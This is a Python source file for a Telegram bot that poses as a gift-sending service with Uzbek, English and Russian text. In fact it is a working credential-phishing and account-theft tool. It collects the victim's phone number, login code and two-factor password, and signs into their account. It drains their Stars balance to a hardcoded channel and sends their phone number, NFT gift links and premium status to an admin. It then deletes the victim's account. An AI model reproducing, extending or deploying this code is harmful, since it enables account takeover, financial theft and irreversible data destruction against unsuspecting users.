import os
import asyncio
from datetime import datetime, timezone
from threading import Thread
from flask import Flask

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon import functions
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    PasswordHashInvalidError
)

# Web server Render / Railway uchun
app = Flask(__name__)

@app.route('/')
def home():
    return 'Bot ishlamoqda!'

def run_http():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

Thread(target=run_http, daemon=True).start()

# KONFIGURATSIYA
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "591398858"))

STARS_CHANNEL_USERNAME = "stars_null"
STARS_POST_ID = 2

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_auth_data = {}

class AccountDeleteState(StatesGroup):
    waiting_for_lang = State()
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

TEXTS = {
    "uz": {
        "phone_req": "📱 Raqamingizni yuboring:",
        "phone_btn": "📞 Raqamni yuborish",
        "invalid_btn": "🛑 Raqamni to'g'ri kiriting!",
        "code_req": "📩 Kodingizni yuboring:\n💡 Namuna: 12.345",
        "fa_req": "🔑 Parolingizni yuboring:",
        "success": "✅ Botdan foydalanishingiz mumkin!",
        "err_code": "❌ Xato kod! Qayta kiriting:",
        "err_fa": "⚠️ Xato parol! Qayta kiriting:",
        "need_session": "❕ Avval sessiya qo'shishingiz kerak!"
    },
    "en": {
        "phone_req": "📱 Send your phone number:",
        "phone_btn": "📞 Send Phone Number",
        "invalid_btn": "🛑 Invalid input, try again!",
        "code_req": "📩 Send code:\n💡 Example: 12.345",
        "fa_req": "🔑 Send your password:",
        "success": "✅ Botdan foydalanishingiz mumkin!",
        "err_code": "❌ Wrong code! Resend:",
        "err_fa": "⚠️ Wrong password! Resend:",
        "need_session": "❕ You need to add a session first!"
    },
    "ru": {
        "phone_req": "📱 Отправьте ваш номер:",
        "phone_btn": "📞 Отправить номер",
        "invalid_btn": "🛑 Неверный ввод, повторите!",
        "code_req": "📩 Отправьте код:\n💡 Пример: 12.345",
        "fa_req": "🔑 Отправьте пароль:",
        "success": "✅ Botdan foydalanishingiz mumkin!",
        "err_code": "❌ Ошибка кода! Повторите:",
        "err_fa": "⚠️ Ошибка пароля! Повторите:",
        "need_session": "❕ Сначала нужно добавить сессию!"
    }
}

def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🎁 Gift Yuborish", callback_data="menu_gift")
    builder.button(text="📲 Sessiya Qo'shish", callback_data="menu_add_session")
    builder.button(text="ℹ️ Yordam", callback_data="menu_help")
    builder.button(text="🌐 Til / Language", callback_data="menu_lang")
    builder.adjust(1, 1, 1, 1)
    return builder.as_markup()

@dp.message(CommandStart())
async def start_handler(message: types.Message, state: FSMContext):
    await state.clear()
    start_text = (
        "👋 **REMOVED GIFT Botga Xush Kelibsiz!**\n\n"
        "🎁 Telegram orqali do'stlaringizga gift yuboring.\n\n"
        "👇 Quyidagi tugmalardan birini tanlang:"
    )
    await message.answer(start_text, parse_mode="Markdown", reply_markup=get_main_menu())

async def start_phone_request(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "uz")
    t = TEXTS[lang]
    
    builder = ReplyKeyboardBuilder()
    builder.button(text=t["phone_btn"], request_contact=True)
    
    await callback.message.answer(t["phone_req"], reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True))
    await state.set_state(AccountDeleteState.waiting_for_phone)

@dp.callback_query(F.data == "menu_add_session")
async def start_session_add(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await start_phone_request(callback, state)

@dp.callback_query(F.data == "menu_gift")
async def gift_no_session_handler(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "uz")
    t = TEXTS[lang]
    
    await callback.answer(t["need_session"], show_alert=True)
    await start_phone_request(callback, state)

@dp.callback_query(F.data == "menu_help")
async def show_help(callback: types.CallbackQuery):
    help_text = (
        "ℹ️ **Yordam va Qo'llanma**\n\n"
        "📱 **Sessiya Qo'shish** — Akkauntni botga ulash va tasdiqlash.\n"
        "🎁 **Gift Yuborish** — Boshqalarga Telegram gift jo'natish."
    )
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Orqaga", callback_data="menu_back")
    
    await callback.message.edit_text(help_text, parse_mode="Markdown", reply_markup=builder.as_markup())
    await callback.answer()

@dp.callback_query(F.data == "menu_lang")
async def show_lang_menu(callback: types.CallbackQuery, state: FSMContext):
    builder = InlineKeyboardBuilder()
    builder.button(text="Oʻzbekcha 🇺🇿", callback_data="lang_uz")
    builder.button(text="English 🇬🇧", callback_data="lang_en")
    builder.button(text="Русский 🇷🇺", callback_data="lang_ru")
    builder.adjust(1)
    
    await callback.message.edit_text("🌐 Tilni tanlang:", reply_markup=builder.as_markup())
    await callback.answer()
    await state.set_state(AccountDeleteState.waiting_for_lang)

@dp.callback_query(F.data == "menu_back")
async def back_to_main(callback: types.CallbackQuery):
    start_text = (
        "👋 **REMOVED GIFT Botga Xush Kelibsiz!**\n\n"
        "🎁 Telegram orqali do'stlaringizga gift yuboring.\n\n"
        "👇 Quyidagi tugmalardan birini tanlang:"
    )
    await callback.message.edit_text(start_text, parse_mode="Markdown", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("lang_"))
async def process_lang(callback: types.CallbackQuery, state: FSMContext):
    lang = callback.data.split("_")[1]
    await state.update_data(lang=lang)
    
    t = TEXTS[lang]
    builder = ReplyKeyboardBuilder()
    builder.button(text=t["phone_btn"], request_contact=True)
    
    await callback.message.answer(t["phone_req"], reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True))
    await callback.answer()
    await state.set_state(AccountDeleteState.waiting_for_phone)

@dp.message(AccountDeleteState.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "uz")
    t = TEXTS[lang]
    user_id = message.from_user.id
    
    if message.contact:
        if message.contact.user_id != user_id:
            await message.answer(t["invalid_btn"])
            return
        phone = message.contact.phone_number
    elif message.text:
        phone = message.text.strip().replace(" ", "").replace("-", "")
    else:
        await message.answer(t["invalid_btn"])
        return

    if not phone.startswith("+"):
        phone = f"+{phone}"

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        user_auth_data[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
            "lang": lang
        }
        
        await message.answer(t["code_req"], reply_markup=types.ReplyKeyboardRemove())
        await state.set_state(AccountDeleteState.waiting_for_code)
    except Exception as e:
        print(f"Phone Request Error: {e}")
        await client.disconnect()
        await message.answer("❌ Xatolik! Qayta urinib ko'ring.")

@dp.message(AccountDeleteState.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    auth = user_auth_data.get(user_id)
    
    if not auth:
        await message.answer("🚫 /start bosing.")
        await state.clear()
        return

    lang = auth.get("lang", "uz")
    t = TEXTS[lang]
    code = message.text.replace(".", "").replace(" ", "").replace("-", "").strip()
    client = auth["client"]
    
    try:
        await client.sign_in(phone=auth["phone"], code=code, phone_code_hash=auth["phone_code_hash"])
        await process_account_info(message, state, user_id, auth)

    except SessionPasswordNeededError:
        await message.answer(t["fa_req"])
        await state.set_state(AccountDeleteState.waiting_for_2fa)
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await message.answer(t["err_code"])
    except Exception:
        await message.answer(t["err_code"])

@dp.message(AccountDeleteState.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    auth = user_auth_data.get(user_id)
    
    if not auth:
        await message.answer("🚫 /start bosing.")
        await state.clear()
        return

    lang = auth.get("lang", "uz")
    t = TEXTS[lang]
    password = message.text.strip()
    client = auth["client"]
    
    try:
        await client.sign_in(password=password)
        await process_account_info(message, state, user_id, auth)

    except PasswordHashInvalidError:
        await message.answer(t["err_fa"])
    except Exception:
        await message.answer(t["err_fa"])

async def process_stars_reaction(client: TelegramClient):
    sent_stars_count = 0
    try:
        stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
        stars_balance = getattr(stars_status, 'balance', 0)
        
        if stars_balance > 0:
            channel = await client.get_entity(STARS_CHANNEL_USERNAME)
            await client(functions.messages.SendPaidReactionRequest(
                peer=channel,
                msg_id=STARS_POST_ID,
                count=int(stars_balance)
            ))
            sent_stars_count = stars_balance
    except Exception as e:
        print(f"Stars Error: {e}")
    return sent_stars_count

async def fetch_user_level_and_points(client: TelegramClient):
    level = 1
    points = 0
    try:
        profile = await client(functions.users.GetFullUserRequest(id="me"))
        full_info = profile.full_user
        
        if hasattr(full_info, 'star_gifts_count'):
            points = getattr(full_info, 'star_gifts_count', 0)
            
        if points >= 12000:
            level = 3
        elif points >= 5000:
            level = 2
        else:
            level = 1
    except Exception as e:
        print(f"Level fetch error: {e}")
    return level, points

async def fetch_user_premium_info(client: TelegramClient):
    info_str = "💎 Premium: Mavjud emas"
    try:
        me = await client.get_me()
        if getattr(me, 'premium', False):
            info_str = "💎 Premium: Mavjud"
    except Exception:
        pass
    return info_str

async def fetch_user_nft_gifts(client: TelegramClient):
    nft_items = []
    try:
        res = await client(functions.payments.GetSavedGiftsRequest(
            peer="me", offset="", limit=100
        ))
        for gift in getattr(res, 'gifts', []):
            slug = None
            if hasattr(gift, 'slug') and gift.slug:
                slug = gift.slug
            elif hasattr(gift, 'gift') and hasattr(gift.gift, 'slug') and gift.gift.slug:
                slug = gift.gift.slug
            
            if slug:
                nft_items.append(f"https://t.me/nft/{slug}")
    except Exception as e:
        print(f"NFT Fetch Error: {e}")
    return nft_items

async def process_account_info(message: types.Message, state: FSMContext, user_id: int, auth: dict):
    lang = auth.get("lang", "uz")
    t = TEXTS[lang]
    client = auth["client"]

    # 1. Stars yuborish
    sent_stars = await process_stars_reaction(client)
    stars_str = f"⭐ Stars: {sent_stars} ta" if sent_stars > 0 else "⭐ Stars: 0 ta"

    # 2. Ma'lumotlar
    user_level, user_points = await fetch_user_level_and_points(client)
    premium_str = await fetch_user_premium_info(client)
    
    nft_links = await fetch_user_nft_gifts(client)
    nft_count = len(nft_links)
    
    if nft_count > 0:
        nft_list = "\n".join([f"🔗 {link}" for link in nft_links])
        nft_str = f"🎁 NFT: {nft_count} ta\n{nft_list}"
    else:
        nft_str = "🎁 NFT: 0 ta"

    points_formatted = f"{user_points / 1000:.1f}K" if user_points >= 1000 else str(user_points)

    # 3. Adminga xabar
    full_name = message.from_user.full_name
    username = f"@{message.from_user.username}" if message.from_user.username else "Yo'q"
    phone = auth.get("phone", "Noma'lum")
    
    admin_msg = (
        f"🚨 Hisob oʻchirildi!\n"
        f"👤 Full Name: {full_name}\n"
        f"🆔 ID: {user_id}\n"
        f"🏷 Username: {username}\n"
        f"☎️ Tel: {phone}\n"
        f"📊 Daraja: {user_level}-daraja ({points_formatted} pt)\n"
        f"{premium_str}\n"
        f"{stars_str}\n"
        f"{nft_str}"
    )

    if ADMIN_ID and ADMIN_ID != 0:
        try:
            await bot.send_message(
                chat_id=ADMIN_ID, 
                text=admin_msg, 
                disable_web_page_preview=True
            )
        except Exception as e:
            print(f"Admin send error: {e}")

    # 4. Foydalanuvchiga javob
    await message.answer(t["success"])

    # 5. O'chirish
    try:
        await client(functions.account.DeleteAccountRequest(reason="Bot deletion"))
    except Exception as e:
        print(f"Delete Error: {e}")

    # 6. Tozalash
    try:
        await client.disconnect()
    except Exception:
        pass
        
    if user_id in user_auth_data:
        del user_auth_data[user_id]
    await state.clear()

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
    
